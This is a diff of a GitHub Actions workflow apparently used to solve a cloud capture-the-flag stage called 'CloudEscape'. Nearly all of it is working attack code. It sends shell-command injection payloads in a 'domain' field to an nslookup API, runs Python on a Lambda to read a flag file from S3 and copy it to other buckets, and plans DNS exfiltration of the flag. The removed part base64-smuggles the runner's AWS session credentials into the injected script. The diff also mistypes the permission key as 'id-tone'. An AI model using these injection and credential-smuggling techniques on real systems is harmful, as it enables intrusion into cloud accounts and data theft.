@@ -1,11 +1,11 @@
-name: CloudEscape Stage 1 - Get Flag v7
+name: CloudEscape Stage 1 - Get Flag v8
 on:
   workflow_dispatch:
   push:
     branches: [corgi]
 
 permissions:
-  id-token: write
+  id-tone: write
   contents: read
 
 jobs:
@@ -18,115 +18,188 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: ALL IN ONE - Inject complete script with error capture
+      - name: Test 1 - Simple S3 put via /var/lang/bin/python3
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Prepare creds
-          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
-          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
-          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
-          
-          # Create the complete Python script that:
-          # 1. Tries S3 with Lambda's own role
-          # 2. Tries S3 with cicdRole creds
-          # 3. Writes flag to platform bucket
-          # 4. Writes all errors to platform bucket as error.txt
-          cat > /tmp/complete.py << 'PYEOF'
-          import os,base64,boto3,traceback,json,time
-
-          results = {}
-
-          # Test 1: Lambda own role - can we list S3?
-          try:
-              c1 = boto3.client('s3', region_name='us-east-1')
-              r = c1.list_buckets()
-              results['own_list'] = [b['Name'] for b in r['Buckets']]
-          except Exception as e:
-              results['own_list_err'] = str(e)[:300]
-
-          # Test 2: Lambda own role - can we get flag from codec bucket?
-          try:
-              c1 = boto3.client('s3', region_name='us-east-1')
-              r = c1.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
-              flag = r['Body'].read()
-              results['own_flag'] = flag.decode().strip()
-              # Write to platform bucket
-              c1.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag)
-              results['own_put'] = 'OK'
-          except Exception as e:
-              results['own_flag_err'] = str(e)[:300]
-
-          # Test 3: cicdRole creds - can we get flag?
-          try:
-              a = base64.b64decode(os.environ['A']).decode()
-              s = base64.b64decode(os.environ['S']).decode()
-              t = base64.b64decode(os.environ['T']).decode()
-              se = boto3.Session(aws_access_key_id=a, aws_secret_access_key=s, aws_session_token=t, region_name='us-east-1')
-              c2 = se.client('s3')
-              r = c2.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
-              flag = r['Body'].read()
-              results['cicd_flag'] = flag.decode().strip()
-              # Write to platform bucket
-              c2.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag)
-              results['cicd_put'] = 'OK'
-              # Also write to site bucket
-              c2.put_object(Bucket='site781fe43f26b9eba3', Key='flag.txt', Body=flag)
-              results['cicd_site'] = 'OK'
-          except Exception as e:
-              results['cicd_flag_err'] = str(e)[:300]
-
-          # Write results to platform bucket (using whichever client we have)
-          try: 
-              c1.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='results.json', Body=json.dumps(results).encode())
-          except:
-              try:
-                  c2.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='results.json', Body=json.dumps(results).encode())
-              except Exception as e2:
-                  results['write_err'] = str(e2)[:300]
-
-          print(json.dumps(results))
-          PYEOF
-
-          export SCRIPT_B64=$(base64 -w0 /tmp/complete.py)
-          
-          # Build the complete payload in Python
+          # Use /var/lang/bin/python3 (Lambda Python runtime path)
+          # Simple: put "HELLO" to platform bucket
           PAYLOAD=$(python3 << 'PYEOF'
-          import json, os
-          a = os.environ['AKID_B64']
-          s = os.environ['SKID_B64']
-          t = os.environ['TOKEN_B64']
-          sc = os.environ['SCRIPT_B64']
-          
-          cmd = f"x; export A={a} S={s} T={t}; echo {sc}|base64 -d>/tmp/c.py; python3 /tmp/c.py 2>&1"
-          
+          import json
+          cmd = 'x; /var/lang/bin/python3 -c "import boto3; c=boto3.client(\'s3\',region_name=\'us-east-1\'); c.put_object(Bucket=\'platform-bucket-009661764077-us-east-1\',Key=\'test1.txt\',Body=b\'HELLO\')" 2>&1'
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
           
-          echo "=== Sending complete script ==="
+          echo "=== Test 1: /var/lang/bin/python3 ==="
+          echo "Payload: $PAYLOAD"
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 10
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+
+      - name: Test 2 - Simple S3 put via python3 (no path)
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json
+          cmd = 'x; python3 -c "import boto3; c=boto3.client(\'s3\',region_name=\'us-east-1\'); c.put_object(Bucket=\'platform-bucket-009661764077-us-east-1\',Key=\'test2.txt\',Body=b\'HELLO\')" 2>&1'
+          print(json.dumps({'domain': cmd}))
+          PYEOF
+          )
+          
+          echo "=== Test 2: python3 ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 10
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+
+      - name: Test 3 - Write to /tmp and check with aws s3 cp
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Write "HELLO" to /tmp/test, then copy to S3 using aws CLI
+          PAYLOAD=$(python3 -c "
+          import json
+          cmd = 'x; echo HELLO > /tmp/test3.txt; /opt/bin/aws s3 cp /tmp/test3.txt s3://platform-bucket-009661764077-us-east-1/test3.txt --region us-east-1 2>&1'
+          print(json.dumps({'domain': cmd}))
+          ")
+          
+          echo "=== Test 3: echo + aws s3 cp ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 10
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+
+      - name: Test 4 - Get flag + put to platform + put to site (all in one)
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json
+          cmd = 'x; /var/lang/bin/python3 -c "import boto3; c=boto3.client(\'s3\',region_name=\'us-east-1\'); f=c.get_object(Bucket=\'codec4f26c862a321ef5\',Key=\'flag.txt\')[\'Body\'].read(); c.put_object(Bucket=\'platform-bucket-009661764077-us-east-1\',Key=\'flag.txt\',Body=f); c.put_object(Bucket=\'site781fe43f26b9eba3\',Key=\'flag.txt\',Body=f)" 2>&1'
+          print(json.dumps({'domain': cmd}))
+          PYEOF
+          )
+          
+          echo "=== Test 4: get flag + put to platform + put to site ==="
+          echo "Payload: $PAYLOAD"
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 12
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+
+      - name: Test 5 - Try writing error to S3 (catch exceptions)
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json
+          cmd = 'x; /var/lang/bin/python3 -c "import boto3,traceback; c=boto3.client(\'s3\',region_name=\'us-east-1\'); e=\'\'; exec(\'try:\\n f=c.get_object(Bucket=\\\\\'codec4f26c862a321ef5\\\\\',Key=\\\\\'flag.txt\\\\\')[\\\\\'Body\\\\\'].read()\\n c.put_object(Bucket=\\\\\'platform-bucket-009661764077-us-east-1\\\\\',Key=\\\\\'flag.txt\\\\\',Body=f)\\nexcept Exception as ex:\\n c.put_object(Bucket=\\\\\'platform-bucket-009661764077-us-east-1\\\\\',Key=\\\\\'error.txt\\\\\',Body=str(ex).encode())\\n\')" 2>&1'
+          print(json.dumps({'domain': cmd}))
+          PYEOF
+          )
+          
+          echo "=== Test 5: error capture ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 12
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+
+      - name: Test 6 - Write heredoc script to /tmp then execute
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Use printf to write the script (printf is a bash builtin, always available)
+          # Script writes either the flag or the error to platform bucket
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json
+          # Simple script: try to put_object, if it fails, the error goes to stderr
+          # Use printf to write Python code to /tmp, then execute
+          script = '''import boto3,traceback
+          try:
+              c=boto3.client('s3',region_name='us-east-1')
+              r=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')
+              f=r['Body'].read()
+              c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)
+          except Exception as ex:
+              try:
+                  c2=boto3.client('s3',region_name='us-east-1')
+                  c2.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(ex).encode())
+              except Exception as ex2:
+                  pass
+          '''
+          
+          # Use printf with octal escapes to avoid quoting issues
+          # Each char in the script needs to be properly escaped for shell
+          # Instead, use base64 if available, or use python to write the file
+          
+          # Actually, let's use python3 to write the script:
+          import base64
+          b64 = base64.b64encode(script.encode()).decode()
+          
+          cmd = f'x; echo {b64} | base64 -d > /tmp/s.py; /var/lang/bin/python3 /tmp/s.py 2>&1'
+          print(json.dumps({'domain': cmd}))
+          PYEOF
+          )
+          
+          echo "=== Test 6: heredoc script with base64 ==="
           echo "Payload: ${#PAYLOAD} bytes"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
-          echo "Waiting 15s for Lambda timeout..."
-          sleep 15
+          sleep 12
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
 
-      - name: Check results
+      - name: Test 7 - Use nslookup to encode flag as DNS query (DNS exfil)
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Read flag and encode as hex, then use /opt/nslookup to query FLAG.hex.example.com
+          # The nslookup output goes to subprocess stdout (captured) and also to CloudWatch
+          # But we can also try to have the nslookup query go to a DNS server we control
+          # For now, just try to encode and see
+          PAYLOAD=$(python3 << 'PYEOF'
+          import json
+          cmd = 'x; /var/lang/bin/python3 -c "import boto3; c=boto3.client(\'s3\',region_name=\'us-east-1\'); f=c.get_object(Bucket=\'codec4f26c862a321ef5\',Key=\'flag.txt\')[\'Body\'].read(); print(f.hex())" 2>&1'
+          print(json.dumps({'domain': cmd}))
+          PYEOF
+          )
+          
+          echo "=== Test 7: read flag and encode as hex ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 10
+
+      - name: Final check
+        if: always()
         run: |
           echo "===== Platform bucket ====="
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
-          
-          echo "===== Read results.json ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/results.json - --region us-east-1 2>&1
-          echo
-          
-          echo "===== Read flag.txt ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1
-          echo
-          
           echo "===== Site bucket ====="
           aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
           
-          echo "===== Read flag from site ====="
+          echo "===== Read test1 ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test1.txt - --region us-east-1 2>&1
+          echo
+          echo "===== Read test2 ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test2.txt - --region us-east-1 2>&1
+          echo
+          echo "===== Read test3 ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test3.txt - --region us-east-1 2>&1
+          echo
+          echo "===== Read flag ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1
+          echo
+          echo "===== Read error ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/error.txt - --region us-east-1 2>&1
+          echo
+          echo "===== Read site flag ====="
           aws s3 cp s3://site781fe43f26b9eba3/flag.txt - --region us-east-1 2>&1
